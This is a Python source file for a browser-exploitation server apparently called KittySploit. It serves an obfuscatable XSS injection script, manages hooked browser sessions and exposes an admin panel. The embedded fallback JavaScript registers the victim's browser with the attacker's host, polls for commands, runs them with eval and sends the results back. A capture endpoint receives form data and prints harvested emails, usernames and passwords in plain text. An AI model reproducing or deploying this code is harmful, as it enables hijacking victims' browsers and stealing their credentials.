#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from core.output_handler import print_info, print_warning, print_error, print_success, print_debug
import os
import json
import time
import uuid
import threading
from datetime import datetime
from typing import Dict, Any, Optional, List
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import socket

class BrowserSession:
    """Represents a browser session"""
    
    def __init__(self, session_id: str, ip_address: str, user_agent: str):
        self.session_id = session_id
        self.ip_address = ip_address
        self.user_agent = user_agent
        self.connected_at = datetime.now()
        self.last_activity = datetime.now()
        self.commands_executed = 0
        self.browser_info = {}
        self.commands_queue = []
        self.responses = []
        self.is_connected = True
        self.websocket_connection_id = None
        # Track polling activity to detect if session is truly dead
        self.polling_timestamps = []  # Keep last 5 polling timestamps
        self.max_polling_history = 5
        # Fingerprint storage for browser property matching
        self.fingerprint = None  # Will be a dict with 'hash', 'properties', 'timestamp' when set
    
    def add_command(self, command: Dict[str, Any]):
        """Add command to queue"""
        self.commands_queue.append(command)
        self.update_activity()
    
    def add_response(self, response: Dict[str, Any]):
        """Add response from browser"""
        self.responses.append(response)
        self.update_activity()
    
    def update_activity(self):
        """Update last activity timestamp"""
        self.last_activity = datetime.now()
        # Track polling timestamps for health checking
        self.polling_timestamps.append(datetime.now())
        # Keep only last N timestamps
        if len(self.polling_timestamps) > self.max_polling_history:
            self.polling_timestamps.pop(0)
    
    def is_polling_active(self, expected_interval: float = 1.0, tolerance: float = 15.0) -> bool:
        """
        Check if session is actively polling
        
        Args:
            expected_interval: Expected polling interval in seconds (default: 1.0)
            tolerance: Tolerance in seconds for considering polling active (default: 15.0)
                      Increased to handle network delays and browser throttling
            
        Returns:
            bool: True if polling appears active, False otherwise
        """
        if not self.polling_timestamps:
            return False
        
        # Check if we've received a polling request recently (within tolerance)
        time_since_last_poll = (datetime.now() - self.polling_timestamps[-1]).total_seconds()
        
        # If last poll was recent, consider it active
        if time_since_last_poll <= tolerance:
            return True
        
        # Check intervals between recent polls if we have enough data
        if len(self.polling_timestamps) >= 2:
            # Check intervals between recent polls
            recent_intervals = []
            for i in range(1, len(self.polling_timestamps)):
                interval = (self.polling_timestamps[i] - self.polling_timestamps[i-1]).total_seconds()
                recent_intervals.append(interval)
            
            # If average interval is reasonable (within tolerance of expected), polling is active
            if recent_intervals:
                avg_interval = sum(recent_intervals) / len(recent_intervals)
                # Consider active if average interval is within reasonable range
                # (allowing for network delays, browser throttling, etc.)
                return avg_interval <= (expected_interval * 2 + tolerance)
        
        return False
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert session to dictionary"""
        return {
            'session_id': self.session_id,
            'ip_address': self.ip_address,
            'user_agent': self.user_agent,
            'connected_at': self.connected_at.isoformat(),
            'last_activity': self.last_activity.isoformat(),
            'commands_executed': self.commands_executed,
            'browser_info': self.browser_info,
            'is_connected': self.is_connected
        }

class BrowserHTTPHandler(BaseHTTPRequestHandler):
    """HTTP request handler for browser server"""
    
    def __init__(self, *args, browser_server=None, **kwargs):
        self.browser_server = browser_server
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        """Handle GET requests"""
        try:
            parsed_path = urlparse(self.path)
            path = parsed_path.path
            
            # Log polling requests for debugging (only occasionally to avoid spam)
            if path.startswith('/api/session/') and path.endswith('/commands'):
                path_parts = path.split('/')
                session_id = path_parts[-2] if len(path_parts) >= 4 else path_parts[-1]
                # Only log every 10th request to avoid spam
                import random
                if random.random() < 0.1:  # 10% chance
                    print_debug(f"[DEBUG] Polling request from session: {session_id[:8]}...")
            
            if path == '/inject.js':
                self.serve_injection_script()
            elif path == '/xss.js':
                self.serve_xss_injection_script()
            elif path == '/admin':
                self.serve_admin_interface()
            elif path == '/test':
                self.serve_test_page()
            elif path == '/sw.js' or path == '/service-worker.js':
                self.serve_service_worker()
            elif path == '/api/sessions':
                self.serve_sessions_api()
            elif path == '/api/status':
                self.serve_status_api()
            elif path.startswith('/api/session/'):
                # Extract session_id correctly from path like /api/session/{session_id}/commands
                path_parts = path.split('/')
                if path.endswith('/commands'):
                    # Path is /api/session/{session_id}/commands
                    session_id = path_parts[-2] if len(path_parts) >= 4 else path_parts[-1]
                    self.serve_session_commands_api(session_id)
                else:
                    # Path is /api/session/{session_id}
                    session_id = path_parts[-1]
                    self.serve_session_api(session_id)
            elif path.startswith('/static/'):
                # Serve static files (icons, CSS, etc.)
                self.serve_static_file(path[8:])  # Remove '/static/' prefix
            else:
                self.send_error(404, "Not Found")
                
        except Exception as e:
            print_error(f"Error handling GET request: {e}")
            self.send_error(500, "Internal Server Error")
    
    def do_POST(self):
        """Handle POST requests"""
        try:
            parsed_path = urlparse(self.path)
            path = parsed_path.path
            if path == '/api/register':
                self.handle_browser_registration()
            elif path == '/api/command':
                self.handle_command_response()
            elif path == '/api/capture':
                self.handle_capture_data()
            elif path.startswith('/api/session/'):
                # Extract session_id correctly from path like /api/session/{session_id}/command
                path_parts = path.split('/')
                if path.endswith('/command'):
                    # Path is /api/session/{session_id}/command
                    session_id = path_parts[-2] if len(path_parts) >= 4 else path_parts[-1]
                    self.handle_session_command(session_id)
                else:
                    self.send_error(404, "Not Found")
            else:
                self.send_error(404, "Not Found")
                
        except Exception as e:
            print_error(f"Error handling POST request: {e}")
            self.send_error(500, "Internal Server Error")
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def serve_injection_script(self):
        """Serve the browser injection script"""
        script_content = self.browser_server.get_injection_script()
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/javascript; charset=utf-8')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        self.wfile.write(script_content.encode('utf-8'))
    
    def serve_xss_injection_script(self):
        """Serve the XSS-optimized injection script"""
        script_content = self.browser_server.get_xss_injection_script()
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/javascript; charset=utf-8')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        self.wfile.write(script_content.encode('utf-8'))
    
    def serve_admin_interface(self):
        """Serve the admin interface"""
        html_content = self.browser_server.get_admin_interface()
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
    
    def serve_test_page(self):
        """Serve the test page"""
        html_content = self.browser_server.get_test_page()
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
    
    def serve_service_worker(self):
        """Serve a minimal service worker for PWA support"""
        sw_content = """const CACHE_NAME = 'ks-pwa-cache-v1';

self.addEventListener('install', (event) => {
    console.log('[SW] Installing service worker');
    event.waitUntil(
        caches.open(CACHE_NAME).then((cache) => {
            return cache.addAll(['/']);
        })
    );
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    console.log('[SW] Activating service worker');
    event.waitUntil(
        caches.keys().then((cacheNames) => {
            return Promise.all(
                cacheNames.map((cacheName) => {
                    if (cacheName !== CACHE_NAME) {
                        return caches.delete(cacheName);
                    }
                })
            );
        })
    );
    return self.clients.claim();
});

self.addEventListener('fetch', (event) => {
    event.respondWith(
        caches.match(event.request).then((response) => {
            return response || fetch(event.request);
        })
    );
});
"""
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/javascript')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Cache-Control', 'no-cache')
        self.end_headers()
        self.wfile.write(sw_content.encode('utf-8'))
    
    def serve_static_file(self, file_path: str):
        """Serve static files (icons, CSS, etc.)"""
        import os
        import mimetypes
        
        # Security: prevent directory traversal
        if '..' in file_path or file_path.startswith('/'):
            self.send_error(403, "Forbidden")
            return
        
        # Build full path to static file
        static_dir = os.path.join(os.path.dirname(__file__), 'browser_static')
        full_path = os.path.join(static_dir, file_path)
        
        # Check if file exists
        if not os.path.exists(full_path) or not os.path.isfile(full_path):
            self.send_error(404, "File Not Found")
            return
        
        # Detect content type
        content_type, _ = mimetypes.guess_type(full_path)
        if content_type is None:
            content_type = 'application/octet-stream'
        
        try:
            # Read and serve file
            with open(full_path, 'rb') as f:
                content = f.read()
            
            self.send_response(200)
            self.send_header('Content-Type', content_type)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Cache-Control', 'public, max-age=86400')  # Cache for 1 day
            self.end_headers()
            self.wfile.write(content)
        except Exception as e:
            print_error(f"Error serving static file {file_path}: {e}")
            self.send_error(500, "Internal Server Error")
    
    def serve_sessions_api(self):
        """Serve sessions API"""
        sessions_data = {}
        for session_id, session in self.browser_server.sessions.items():
            sessions_data[session_id] = session.to_dict()
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(sessions_data).encode('utf-8'))
    
    def serve_status_api(self):
        """Serve status API"""
        status_data = {
            'running': self.browser_server.is_running(),
            'uptime': self.browser_server.get_uptime(),
            'total_sessions': len(self.browser_server.sessions),
            'total_commands': self.browser_server.stats['total_commands']
        }
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(status_data).encode('utf-8'))
    
    def serve_session_api(self, session_id: str):
        """Serve session API"""
        session = self.browser_server.get_session(session_id)
        if session:
            # Update last activity when session info is requested
            session.update_activity()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(session.to_dict()).encode('utf-8'))
        else:
            self.send_error(404, "Session not found")
    
    def serve_session_commands_api(self, session_id: str):
        """Serve session commands for HTTP polling"""
        session = self.browser_server.get_session(session_id)
        if not session:
            # Session doesn't exist - tell browser to stop polling

            print_debug(f"[WARNING] Polling request for unknown session: {session_id[:8]}...")
            response_data = {
                'commands': [],
                'session_id': session_id,
                'status': 'session_not_found',
                'stop_polling': True
            }
            self.send_response(200)  # Return 200 so browser doesn't retry
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response_data).encode('utf-8'))
            return
        
        # Update last activity when browser polls for commands
        # This prevents the session from being cleaned up while the page is open
        # CRITICAL: Always update activity when we receive a polling request
        # This is the definitive proof that the session is still alive
        old_activity = session.last_activity
        session.update_activity()
        
        # Debug: Log activity updates (only occasionally to avoid spam)
        time_since_last = (datetime.now() - old_activity).total_seconds()
        if time_since_last > 5:  # Only log if there was a gap
            print_debug(f"Session {session_id[:8]}... activity updated (gap: {time_since_last:.1f}s)")
        
        # Get pending commands
        commands = session.commands_queue.copy()
        # Debug: log commands being sent
        if commands:
            print_debug(f"Sending {len(commands)} command(s) to session {session_id[:8]}...")
            for cmd in commands:
                print_debug(f"\t- Type: {cmd.get('type', 'unknown')}, ID: {cmd.get('id', 'none')}")
        # Clear the queue after sending
        session.commands_queue.clear()
        
        response_data = {
            'commands': commands,
            'session_id': session_id,
            'status': 'active'
        }
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(response_data).encode('utf-8'))
    
    def handle_browser_registration(self):
        """Handle browser registration"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            session_id = self.browser_server.register_browser(
                ip_address=self.client_address[0],
                user_agent=self.headers.get('User-Agent', 'Unknown'),
                browser_info=data
            )
            
            response = {
                'session_id': session_id,
                'status': 'registered',
                'server_time': datetime.now().isoformat()
            }
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode('utf-8'))
            
        except Exception as e:
            print_error(f"Error handling browser registration: {e}")
            self.send_error(400, "Bad Request")
    
    def handle_command_response(self):
        """Handle command response from browser"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            session_id = data.get('session_id')
            command_id = data.get('command_id')
            result = data.get('result')
            
            if session_id and command_id:
                self.browser_server.handle_command_response(session_id, command_id, result)
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode('utf-8'))
            
        except Exception as e:
            print_error(f"Error handling command response: {e}")
            self.send_error(400, "Bad Request")
    
    def handle_session_command(self, session_id: str):
        """Handle command for specific session"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            command = data.get('command')
            
            if command:
                print_debug(f"Received command for session {session_id[:8]}...: {command.get('type', 'unknown')}")
                self.browser_server.send_command_to_session(session_id, command)
            else:
                print_warning(f"No command found in request data: {data}")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode('utf-8'))
            
        except Exception as e:
            print_error(f"Error handling session command: {e}")
            import traceback
            traceback.print_exc()
            self.send_error(400, "Bad Request")
    
    def handle_capture_data(self):
        """Handle captured form data from browser"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            
            # Store captured data in browser server
            if self.browser_server:
                self.browser_server.store_captured_data(data)
            
            # Print captured data
            captured_data = data.get('data', {})
            if captured_data:
                print_success(f"Captured form data from {data.get('url', 'unknown')}")
                # Handle both structures: direct fields or nested fields
                if isinstance(captured_data, dict):
                    # Check if it's the autofill structure (direct fields)
                    if 'email' in captured_data or 'username' in captured_data or 'password' in captured_data:
                        fields = captured_data
                    # Or if it's the form submission structure (nested fields)
                    elif 'fields' in captured_data:
                        fields = captured_data.get('fields', {})
                    else:
                        fields = captured_data
                    
                    if fields.get('email'):
                        print_info(f"  Email: {fields.get('email')}")
                    if fields.get('username'):
                        print_info(f"  Username: {fields.get('username')}")
                    if fields.get('password'):
                        # Display password in plain text (for security testing purposes)
                        print_info(f"  Password: {fields.get('password')}")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode('utf-8'))
            
        except Exception as e:
            print_error(f"Error handling capture data: {e}")
            self.send_error(400, "Bad Request")
    
    def log_message(self, format, *args):
        """Override to reduce log noise"""
        # Only log important messages
        if "404" not in format % args and "200" not in format % args:
            super().log_message(format, *args)

class BrowserServer:
    """Main browser server class - HTTP polling only"""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 8080, 
                 timeout: int = 30, framework=None, cleanup_interval: int = 60,
                 obfuscate_js: bool = False, obfuscation_level: str = "simple"):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.framework = framework
        self.cleanup_interval = cleanup_interval  # Seconds between cleanup checks
        self.obfuscate_js = obfuscate_js  # Enable/disable JavaScript obfuscation
        self.obfuscation_level = obfuscation_level  # 'simple', 'medium', 'heavy', or 'custom'
        
        self.sessions: Dict[str, BrowserSession] = {}
        self.total_requests = 0
        self.start_time = None
        self.server = None
        self.server_thread = None
        self.cleanup_thread = None
        self.running = False
        
        # Statistics
        self.stats = {
            'total_sessions': 0,
            'total_commands': 0,
            'total_responses': 0,
            'cleaned_sessions': 0
        }
        
        # Store captured form data
        self.captured_data: List[Dict[str, Any]] = []
    
    def start(self):
        """Start the browser server"""
        try:
            # Create custom handler with browser_server reference
            def handler(*args, **kwargs):
                return BrowserHTTPHandler(*args, browser_server=self, **kwargs)
            
            self.server = HTTPServer((self.host, self.port), handler)
            self.start_time = datetime.now()
            self.running = True
            
            print_success(f"Browser server started on {self.host}:{self.port}")
            
            # Start HTTP server in a separate thread
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            
            # Start cleanup thread
            self.cleanup_thread = threading.Thread(target=self._cleanup_loop, daemon=True)
            self.cleanup_thread.start()
            
            print_success(f"Cleanup thread started (interval: {self.cleanup_interval}s)")
            
        except Exception as e:
            print_error(f"Error starting browser server: {e}")
            self.running = False
    
    def stop(self):
        """Stop the browser server and cleanup all active sessions"""
        if self.server:
            # Count active sessions before cleanup
            active_sessions_count = len(self.sessions)
            
            # Cleanup all active sessions
            if active_sessions_count > 0:
                print_status(f"Cleaning up {active_sessions_count} active session(s)...")
                # Create a list of session IDs to avoid modifying dict during iteration
                session_ids = list(self.sessions.keys())
                for session_id in session_ids:
                    self._remove_session(session_id)
                print_success(f"All {active_sessions_count} session(s) closed successfully")
            
            # Stop the server
            self.running = False
            self.server.shutdown()
            self.server.server_close()
            
            # Clear session storage
            self.sessions.clear()
            
            print_success("Browser server stopped")
    
    def _cleanup_loop(self):
        """Background cleanup loop for inactive sessions"""
        while self.running:
            try:
                self._cleanup_inactive_sessions()
                time.sleep(self.cleanup_interval)
            except Exception as e:
                print_error(f"Error in cleanup loop: {e}")
                time.sleep(5)  # Wait 5 seconds before retrying
    
    def _cleanup_inactive_sessions(self):
        """
        Clean up inactive browser sessions.
        
        IMPORTANT: We only remove sessions that haven't received ANY polling requests
        for a long time. If we're still receiving polling requests, the session is active
        and should NEVER be removed, regardless of last_activity timestamp.
        """
        if not self.sessions:
            return
        
        current_time = datetime.now()
        inactive_sessions = []
        
        for session_id, session in self.sessions.items():
            # Check time since last activity
            time_since_activity = (current_time - session.last_activity).total_seconds()
            
            # CRITICAL: Check if we have received ANY polling request recently
            # If we have, the session is DEFINITELY active, regardless of last_activity
            has_recent_polling = False
            time_since_last_poll = None
            
            if session.polling_timestamps:
                time_since_last_poll = (current_time - session.polling_timestamps[-1]).total_seconds()
                # If we received a poll within the last (timeout + grace) seconds, session is active
                # Use a generous threshold to account for network delays
                if time_since_last_poll <= (self.timeout + 20):  # Increased grace period
                    has_recent_polling = True
            
            # If we have recent polling activity, NEVER remove the session
            # The fact that we're receiving polls means the browser is still connected
            if has_recent_polling:
                # If last_activity is stale but we're still getting polls, update it
                if time_since_activity > self.timeout:
                    # This shouldn't happen if update_activity() is called correctly,
                    # but update it just in case
                    session.update_activity()
                # Always keep sessions that are still polling
                continue
            
            # No recent polling - check if session should be removed
            # Only remove if we haven't received ANY polling for a long time
            grace_period = 20  # Increased grace period to be more conservative
            
            if time_since_activity > (self.timeout + grace_period):
                # Double-check: make absolutely sure we haven't received any polls
                if not session.polling_timestamps or (time_since_last_poll and time_since_last_poll > (self.timeout + grace_period)):
                    inactive_sessions.append(session_id)
                    print_debug(f"Session {session_id[:8]}... inactive for {time_since_activity:.1f}s (timeout: {self.timeout}s + grace: {grace_period}s), no polling for {time_since_last_poll:.1f}s")
                else:
                    # We have polling timestamps but they're old - but be conservative
                    print_debug(f"Session {session_id[:8]}... has old polling timestamps, but being conservative and keeping alive...")
            else:
                # Session is past timeout but within grace period - give it another chance
                print_debug(f"Session {session_id[:8]}... past timeout ({time_since_activity:.1f}s) but within grace period, keeping alive...")
        
        # Remove inactive sessions
        for session_id in inactive_sessions:
            self._remove_session(session_id)
            self.stats['cleaned_sessions'] += 1
            print_debug(f"Cleaned up inactive session: {session_id[:8]}...")
    
    def _remove_session(self, session_id: str):
        """Remove a session and notify framework"""
        if session_id in self.sessions:
            session = self.sessions.pop(session_id)
            
            # Notify framework session manager
            session_manager = getattr(self.framework, 'session_manager', None)
            if session_manager:
                session_manager.remove_browser_session(session_id)
            
            # Notify shell manager if session has active shell
            shell_manager = getattr(self.framework, 'shell_manager', None)
            if shell_manager:
                shell_manager.remove_shell(session_id)
            
            print_debug(f"Removed browser session: {session_id}")
            return True
        
        return False
    
    def is_running(self) -> bool:
        """Check if server is running"""
        return self.running and self.server is not None
    
    def get_uptime(self) -> str:
        """Get server uptime"""
        if self.start_time:
            uptime = datetime.now() - self.start_time
            return str(uptime).split('.')[0]  # Remove microseconds
        return "0:00:00"
    
    def force_cleanup(self):
        """Force immediate cleanup of inactive sessions"""
        print_debug("Forcing cleanup of inactive sessions...")
        self._cleanup_inactive_sessions()
    
    def get_cleanup_stats(self) -> Dict[str, Any]:
        """Get cleanup statistics"""
        return {
            'cleanup_interval': self.cleanup_interval,
            'timeout': self.timeout,
            'cleaned_sessions': self.stats['cleaned_sessions'],
            'active_sessions': len(self.sessions),
            'total_sessions': self.stats['total_sessions']
        }
    
    def get_injection_script(self) -> str:
        """Get the browser injection script (HTTP polling only)"""
        # Use the same script as XSS optimized version
        return self.get_xss_injection_script()
    
    def get_xss_injection_script(self) -> str:
        """Get the XSS-optimized injection script (HTTP polling only)"""
        try:
            # Read the XSS injection script file
            xss_script_path = os.path.join(os.path.dirname(__file__), 'xss_injection.js')
            with open(xss_script_path, 'r', encoding='utf-8') as f:
                script_content = f.read()
            
            # The script now auto-detects host/port from window.location
            # But we can still replace placeholders as fallback if needed
            # (The script will use window.location.hostname/port by default)
            
            # Apply obfuscation if enabled
            if self.obfuscate_js:
                script_content = self._obfuscate_script(script_content)
            
            return script_content
        except Exception as e:
            print_error(f"Error loading XSS injection script: {e}")
            return self._get_fallback_xss_script()
    
    def _obfuscate_script(self, script: str) -> str:
        """Obfuscate JavaScript script based on obfuscation level"""
        try:
            from core.lib.js_obfuscator import JavaScriptObfuscator
            obfuscator = JavaScriptObfuscator()
            
            if self.obfuscation_level == 'simple':
                return obfuscator.simple_obfuscate(script)
            elif self.obfuscation_level == 'medium':
                return obfuscator.medium_obfuscate(script)
            elif self.obfuscation_level == 'heavy':
                return obfuscator.heavy_obfuscate(script)
            else:
                # Default to simple
                return obfuscator.simple_obfuscate(script)
        except Exception as e:
            print_error(f"Error obfuscating script: {e}")
            # Return original script if obfuscation fails
            return script
    
    def _get_fallback_xss_script(self) -> str:
        return f"""
(function() {{
    'use strict';
    
    function getServerHost() {{
        try {{
            if (document.currentScript && document.currentScript.src) {{
                const scriptUrl = new URL(document.currentScript.src);
                return scriptUrl.hostname;
            }}
        }} catch (e) {{}}
        
        try {{
            const scripts = document.getElementsByTagName('script');
            for (let i = 0; i < scripts.length; i++) {{
                if (scripts[i].src && (scripts[i].src.includes('/inject.js') || scripts[i].src.includes('/xss_injection.js'))) {{
                    const scriptUrl = new URL(scripts[i].src);
                    return scriptUrl.hostname;
                }}
            }}
        }} catch (e) {{}}
        
        if (window.location && window.location.hostname) {{
            return window.location.hostname;
        }}
        
        return '127.0.0.1';
    }}
    
    function getServerPort() {{
        try {{
            if (document.currentScript && document.currentScript.src) {{
                const scriptUrl = new URL(document.currentScript.src);
                return scriptUrl.port || (scriptUrl.protocol === 'https:' ? '443' : '80');
            }}
        }} catch (e) {{}}
        
        try {{
            const scripts = document.getElementsByTagName('script');
            for (let i = 0; i < scripts.length; i++) {{
                if (scripts[i].src && (scripts[i].src.includes('/inject.js') || scripts[i].src.includes('/xss_injection.js'))) {{
                    const scriptUrl = new URL(scripts[i].src);
                    return scriptUrl.port || (scriptUrl.protocol === 'https:' ? '443' : '80');
                }}
            }}
        }} catch (e) {{}}
        
        if (window.location && window.location.port) {{
            return window.location.port;
        }}
        
        return '{self.port}';
    }}
    
    const SERVER_HOST = getServerHost();
    const SERVER_PORT = getServerPort();
    
    let sessionId = null;
    let commandsExecuted = 0;
    
    function generateSessionId() {{
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {{
            const r = Math.random() * 16 | 0;
            const v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        }});
    }}
    
    function registerWithServer() {{
        sessionId = generateSessionId();
        
        const browserInfo = {{
            url: window.location.href,
            title: document.title,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            domain: window.location.hostname
        }};
        
        fetch(`http://${{SERVER_HOST}}:${{SERVER_PORT}}/api/register`, {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(browserInfo)
        }})
        .then(response => response.json())
        .then(data => {{
            if (data.session_id) {{
                sessionId = data.session_id;
                console.log(`[KittySploit] Registered: ${{sessionId}}`);
                startPolling();
            }}
        }})
        .catch(error => {{
            console.error('[KittySploit] Registration failed:', error);
            setTimeout(registerWithServer, 5000);
        }});
    }}
    
    function startPolling() {{
        setInterval(pollForCommands, 1000);
    }}
    
    function pollForCommands() {{
        if (!sessionId) return;
        
        fetch(`http://${{SERVER_HOST}}:${{SERVER_PORT}}/api/session/${{sessionId}}/commands`)
        .then(response => response.json())
        .then(data => {{
            if (data.commands && data.commands.length > 0) {{
                data.commands.forEach(command => executeCommand(command));
            }}
        }})
        .catch(error => {{}});
    }}
    
    function executeCommand(command) {{
        try {{
            commandsExecuted++;
            
            // Only handle execute_js commands
            // All other functionality will be handled by framework modules sending JavaScript
            if (command.type === 'execute_js' && command.code) {{
                try {{
                    const result = eval(command.code);
                    sendResponse(command.id, result !== undefined ? result : 'Executed successfully');
                }} catch (error) {{
                    sendResponse(command.id, `Error: ${{error.message}}`);
                }}
            }}
        }} catch (error) {{
            if (command && command.id) {{
                sendResponse(command.id, `Error: ${{error.message}}`);
            }}
        }}
    }}
    
    function sendResponse(commandId, result) {{
        if (!sessionId || !commandId) return;
        
        fetch(`http://${{SERVER_HOST}}:${{SERVER_PORT}}/api/command`, {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                session_id: sessionId,
                command_id: commandId,
                result: result,
                timestamp: new Date().toISOString()
            }})
        }}).catch(error => {{}});
    }}
    
    window.kittysploit = {{
        sessionId: () => sessionId,
        commandsExecuted: () => commandsExecuted
    }};
    
    if (document.readyState === 'loading') {{
        document.addEventListener('DOMContentLoaded', registerWithServer);
    }} else {{
        registerWithServer();
    }}    
}})();
"""
    
    def get_test_page(self) -> str:
        """Get the test page HTML"""
        return f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KittySploit Test Page</title>
</head>
<body>
    <div class="container">
        <p>Test page for KittySploit framework</p>
    </div>

    <script src="/xss.js"></script>
</body>
</html>
"""
    
    def get_admin_interface(self) -> str:
        """Get the admin interface HTML"""
        return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KittySploit Browser Server</title>
    <style>
        :root {
            color-scheme: dark;
            --bg: #050608;
            --panel: rgba(13, 15, 20, 0.7);
            --panel-glass: rgba(20, 24, 32, 0.4);
            --border: rgba(255, 255, 255, 0.06);
            --accent: #38bdf8;
            --accent-hover: #0ea5e9;
            --success: #4ade80;
            --warning: #fbbf24;
            --danger: #f87171;
            --text: #f1f5f9;
            --muted: #94a3b8;
            --font-main: "Inter", system-ui, -apple-system, sans-serif;
            --font-mono: "JetBrains Mono", monospace;
            --shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: var(--font-main);
            background: 
                radial-gradient(circle at 15% 15%, rgba(56, 189, 248, 0.08), transparent 40%),
                radial-gradient(circle at 85% 15%, rgba(99, 102, 241, 0.08), transparent 40%),
                var(--bg);
            color: var(--text);
            min-height: 100vh;
            padding: 2rem;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            gap: 2rem;
        }
        
        .header {
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.03) 0%, rgba(255, 255, 255, 0) 100%), var(--panel);
            padding: 2.5rem;
            border-radius: 24px;
            border: 1px solid var(--border);
            backdrop-filter: blur(40px);
            box-shadow: var(--shadow);
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
        }
        
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 0.5rem;
            letter-spacing: -0.02em;
            background: linear-gradient(to right, #fff, #94a3b8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .header p {
            color: var(--muted);
            font-size: 1.1rem;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 1.5rem;
        }
        
        .stat-card {
            background: var(--panel-glass);
            backdrop-filter: blur(40px);
            padding: 1.5rem;
            border-radius: 20px;
            border: 1px solid var(--border);
            transition: transform 0.2s ease;
        }
        
        .stat-card:hover {
            transform: translateY(-2px);
            border-color: rgba(255, 255, 255, 0.1);
        }
        
        .stat-card h3 {
            color: var(--muted);
            font-size: 0.85rem;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            margin-bottom: 0.5rem;
        }
        
        .stat-card .value {
            font-size: 2rem;
            font-weight: 600;
            color: var(--text);
        }
        
        .main-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2rem;
        }
        
        @media (max-width: 1024px) {
            .main-content {
                grid-template-columns: 1fr;
            }
        }
        
        .panel {
            background: var(--panel);
            padding: 2rem;
